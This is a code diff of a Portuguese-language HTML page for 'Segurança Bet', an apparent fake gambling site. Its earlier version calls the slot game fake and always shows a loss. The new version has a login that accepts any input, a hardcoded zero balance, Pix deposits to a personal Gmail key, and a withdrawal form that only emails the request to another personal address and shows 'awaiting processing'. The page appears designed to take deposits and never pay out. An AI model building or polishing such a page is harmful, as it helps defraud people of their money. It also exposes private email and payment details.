@@ -2,40 +2,45 @@
 <html lang="pt-br">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Segurança Bet</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     body {
-      background-color: #0b0b0b;
-      color: #fff;
+      background: #0b0b0b;
+      color: white;
       font-family: Arial, sans-serif;
       text-align: center;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
       padding: 20px;
     }
-    .game {
-      background: #222;
-      padding: 20px;
-      margin: 20px auto;
-      border-radius: 10px;
-      width: 300px;
+    .login-box, .main-box {
+      max-width: 400px;
+      margin: 80px auto;
+      padding: 30px;
+      background: #1c1c1c;
+      border-radius: 12px;
+    }
+    input, button, textarea {
+      width: 90%;
+      padding: 10px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 5px;
     }
     button {
       background: #00e676;
-      border: none;
-      padding: 10px 20px;
       color: black;
       font-weight: bold;
       cursor: pointer;
-      border-radius: 5px;
+    }
+    #slots {
+      font-size: 2em;
       margin: 10px;
     }
-    #deposit, #withdraw {
-      background: #1e88e5;
-      color: white;
-    }
-    #result {
-      margin-top: 10px;
-    }
+    .hidden { display: none; }
     .pix-box {
       background: #333;
       padding: 20px;
@@ -48,48 +53,82 @@
   </style>
 </head>
 <body>
-  <h1>Segurança Bet</h1>
-  <h2>Saldo: R$ 0,00</h2>
 
-  <div class="game">
-    <p>Caça-Níquel Fake</p>
-    <button onclick="spin()">Girar</button>
-    <p id="result">Você perdeu!</p>
+<div class="container">
+
+  <div id="login" class="login-box">
+    <h2>Segurança Bet</h2>
+    <input type="text" placeholder="Usuário">
+    <input type="password" placeholder="Senha">
+    <button onclick="entrar()">Entrar</button>
   </div>
 
-  <button id="deposit" onclick="showPix()">Depositar via Pix</button>
-  <button id="withdraw" onclick="showWithdraw()">Sacar via Pix</button>
+  <div id="main" class="main-box hidden">
+    <h1>Segurança Bet</h1>
+    <h2>Saldo: R$ 0,00</h2>
 
-  <div id="pix" class="pix-box" style="display:none;">
-    <h3>Deposite com Pix</h3>
-    <p>Chave: joao.rooaz@gmail.com</p>
-    <p>Copia e Cola:</p>
-    <textarea rows="3" cols="40">00020126590014br.gov.bcb.pix0120joao.rooaz@gmail.com0213SEGURANCABET@5204000053039865802BR5901N6001C62070503***6304573D</textarea>
-    <br>
-    <img src="qrcode.png" alt="QR Code Pix">
+    <div>
+      <h3>Caça-Níquel</h3>
+      <div id="slots">🍒 🍋 🍊</div>
+      <button onclick="spinSlot()">Girar</button>
+      <p id="slot-result">Boa sorte!</p>
+    </div>
+
+    <button onclick="showPix()">Depositar via Pix</button>
+    <button onclick="showSaque()">Solicitar Saque</button>
+
+    <div id="pix" class="pix-box hidden">
+      <h3>Deposite com Pix</h3>
+      <p>Chave: joao.rooaz@gmail.com</p>
+      <p>Copia e Cola:</p>
+      <textarea rows="3" readonly>00020126590014br.gov.bcb.pix0120joao.rooaz@gmail.com0213SEGURANCABET@5204000053039865802BR5901N6001C62070503***6304573D</textarea>
+      <br>
+      <img src="qrcode.png" alt="QR Code Pix">
+    </div>
+
+    <div id="saque" class="pix-box hidden">
+      <h3>Solicitar Saque</h3>
+      <form action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST">
+        <input type="hidden" name="_captcha" value="false">
+        <input type="text" name="chave_pix" placeholder="Sua chave Pix" required>
+        <input type="text" name="valor" placeholder="Valor do saque" required>
+        <button type="submit">Enviar</button>
+      </form>
+      <p>Aguardando processamento...</p>
+    </div>
   </div>
 
-  <div id="form" class="pix-box" style="display:none;">
-    <h3>Solicitar Saque</h3>
-    <form action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST">
-      <input type="hidden" name="_captcha" value="false">
-      <input type="text" name="chave_pix" placeholder="Sua chave Pix" required><br><br>
-      <input type="text" name="valor" placeholder="Valor do saque" required><br><br>
-      <button type="submit">Enviar</button>
-    </form>
-    <p>Aguardando processamento...</p>
-  </div>
+</div>
 
-  <script>
-    function spin() {
-      document.getElementById('result').innerText = "Você perdeu!";
+<script>
+  function entrar() {
+    document.getElementById("login").classList.add("hidden");
+    document.getElementById("main").classList.remove("hidden");
+  }
+
+  function spinSlot() {
+    const symbols = ["🍒", "🍋", "🍊", "🍇", "💎", "🔔"];
+    let s1 = symbols[Math.floor(Math.random() * symbols.length)];
+    let s2 = symbols[Math.floor(Math.random() * symbols.length)];
+    let s3 = symbols[Math.floor(Math.random() * symbols.length)];
+    document.getElementById("slots").innerText = `${s1} ${s2} ${s3}`;
+    if (s1 === s2 && s2 === s3) {
+      document.getElementById("slot-result").innerText = "Você ganhou R$ 0,50!";
+    } else {
+      document.getElementById("slot-result").innerText = "Você perdeu!";
     }
-    function showPix() {
-      document.getElementById('pix').style.display = 'block';
-    }
-    function showWithdraw() {
-      document.getElementById('form').style.display = 'block';
-    }
-  </script>
+  }
+
+  function showPix() {
+    document.getElementById("pix").classList.remove("hidden");
+    document.getElementById("saque").classList.add("hidden");
+  }
+
+  function showSaque() {
+    document.getElementById("saque").classList.remove("hidden");
+    document.getElementById("pix").classList.add("hidden");
+  }
+</script>
+
 </body>
 </html>
